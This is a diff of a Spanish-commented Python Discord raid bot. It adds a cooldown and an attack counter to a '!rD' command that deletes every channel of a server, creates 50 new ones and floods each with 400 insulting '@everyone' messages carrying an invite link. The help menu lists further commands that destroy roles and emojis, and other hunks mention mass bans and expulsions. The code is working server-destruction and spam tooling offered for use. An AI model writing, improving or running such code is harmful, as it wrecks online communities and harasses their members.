@@ -43,10 +43,10 @@ async def on_ready():
 def generar_embed_eje(guild_id):
     global ejecuciones_por_servidor, MAX_EJECUCIONES
     
-    # Obtiene las ejecuciones de este servidor. Si no hay, por defecto es 0
+    # Obtiene las ejecuciones actuales de este servidor
     actuales = ejecuciones_por_servidor.get(guild_id, 0)
     
-    # Color dinámico por estado: Verde (0), Amarillo (1), Rojo (2)
+    # Color dinámico por estado: Verde (0), Amarillo (1), Rojo (2 o más)
     if actuales == 0:
         color = discord.Color.green()
     elif actuales == 1:
@@ -64,7 +64,7 @@ def generar_embed_eje(guild_id):
     return embed
 
 
-# ================= COMANDO !eje SUPER VELOZ =================
+# ================= COMANDO !eje =================
 @bot.command()
 async def eje(ctx):
     if not ctx.guild: return  
@@ -107,8 +107,10 @@ async def banpro(ctx):
         await asyncio.sleep(0.8)
 
 
-# ================= 2. COMANDO RAIDEAR Y SPAM (rD) =================
+# ================= 2. COMANDO RAIDEAR Y SPAM (rD) con COOLDOWN =================
+# 🔥 Modificación: 1 uso cada 600 segundos (10 minutos) por servidor (Guild)
 @bot.command()
+@commands.cooldown(1, 600, commands.BucketType.guild)
 async def rD(ctx):
     global ejecuciones_por_servidor
     if not ctx.guild: return
@@ -118,41 +120,49 @@ async def rD(ctx):
 
     actuales = ejecuciones_por_servidor.get(ctx.guild.id, 0)
 
-    # Control de límite por servidor
+    # Control de límite por concurrencia de ataques simultáneos
     if actuales >= MAX_EJECUCIONES:
-        try: await ctx.send(f"❌ Límite alcanzado en este servidor ({actuales}/{MAX_EJECUCIONES}). No se pueden realizar más ejecuciones.")
+        try: await ctx.send(f"❌ Límite alcanzado en este servidor ({actuales}/{MAX_EJECUCIONES}). Espera a que termine el ataque actual.")
         except: pass
         return
 
-    # 🔥 SUMA INSTANTÁNEA EN MEMORIA (Tiempo Real Asegurado)
+    # Suma al iniciar el ataque
     ejecuciones_por_servidor[ctx.guild.id] = actuales + 1
-    logging.info(f"📈 Contador instantáneo para Guild ID {ctx.guild.id}: {actuales + 1}/{MAX_EJECUCIONES}")
+    logging.info(f"📈 [INICIO] Contador para Guild {ctx.guild.id}: {actuales + 1}/{MAX_EJECUCIONES}")
 
-    channels_to_delete = list(ctx.guild.channels)
-    for channel in channels_to_delete:
-        try: await channel.delete()
-        except: pass
+    try:
+        channels_to_delete = list(ctx.guild.channels)
+        for channel in channels_to_delete:
+            try: await channel.delete()
+            except: pass
 
-    created_channels = []
-    for _ in range(50):
-        try:
-            ch = await ctx.guild.create_text_channel(name="Mc R")
-            created_channels.append(ch)
-        except: pass
-
-    msg_por_canal = 400 
-    
-    async def spam_task(channel):
-        for _ in range(msg_por_canal):
+        created_channels = []
+        for _ in range(50):
             try:
-                await channel.send(f"@everyone server raideado putos respeten a sus mayores https://discord.gg/aACMXB4HSp\n{GIF_URL}")
-                await asyncio.sleep(0.1) 
-            except discord.HTTPException as e:
-                if e.status == 429: await asyncio.sleep(5)
-                else: break
+                ch = await ctx.guild.create_text_channel(name="Mc R")
+                created_channels.append(ch)
+            except: pass
 
-    tasks = [spam_task(ch) for ch in created_channels]
-    await asyncio.gather(*tasks)
+        msg_por_canal = 400 
+        
+        async def spam_task(channel):
+            for _ in range(msg_por_canal):
+                try:
+                    await channel.send(f"@everyone server raideado putos respeten a sus mayores https://discord.gg/aACMXB4HSp\n{GIF_URL}")
+                    await asyncio.sleep(0.1) 
+                except discord.HTTPException as e:
+                    if e.status == 429: await asyncio.sleep(5)
+                    else: break
+
+        # Espera a que todo el spam termine por completo
+        tasks = [spam_task(ch) for ch in created_channels]
+        await asyncio.gather(*tasks)
+
+    finally:
+        # Resta al finalizar (Garantiza que baje a 0 aunque ocurra algún error intermedio)
+        actuales_al_final = ejecuciones_por_servidor.get(ctx.guild.id, 1)
+        ejecuciones_por_servidor[ctx.guild.id] = max(0, actuales_al_final - 1)
+        logging.info(f"📉 [FIN] Contador para Guild {ctx.guild.id} restablecido a: {ejecuciones_por_servidor[ctx.guild.id]}/{MAX_EJECUCIONES}")
 
 
 # ================= 3. EXPULSIÓN MASIVA =================
@@ -372,7 +382,8 @@ async def ayuda(ctx):
         "!rolesD       -> Destruye todos los roles existentes del servidor.\n"
         "!rolesC       -> Genera 50 roles con colores arcoíris aleatorios.\n"
         "!emojisD      -> elimina los emojis y stickers personalizados.\n"
-        "```"
+        "
+```"
     )
     try: 
         await ctx.send(menu)
@@ -380,10 +391,31 @@ async def ayuda(ctx):
         pass
 
 
+# ================= MANEJO DE ERRORES (Muestra el Cooldown) =================
 @bot.event
 async def on_command_error(ctx, error):
-    if isinstance(error, commands.CommandNotFound): return
+    if isinstance(error, commands.CommandNotFound): 
+        return
+    
+    # 🔥 Si el comando !rD está en enfriamiento en ese servidor
+    if isinstance(error, commands.CommandOnCooldown):
+        minutos = int(error.retry_after // 60)
+        segundos = int(error.retry_after % 60)
+        
+        embed_cooldown = discord.Embed(
+            title="⏳ COMANDO EN ENFRIAMIENTO",
+            description=f"Este servidor ya ha sido atacado recientemente.\nDebes esperar **{minutos} minutos y {segundos} segundos** antes de volver a usar `!rD` aquí.",
+            color=discord.Color.red()
+        )
+        embed_cooldown.set_footer(text="MacHUB Engine • Seguridad de Tráfico")
+        
+        try:
+            await ctx.send(embed=embed_cooldown)
+        except:
+            pass
+        return
+        
     logging.error(f"Error: {error}")
 
 bot.run(TOKEN)
-    
+                   
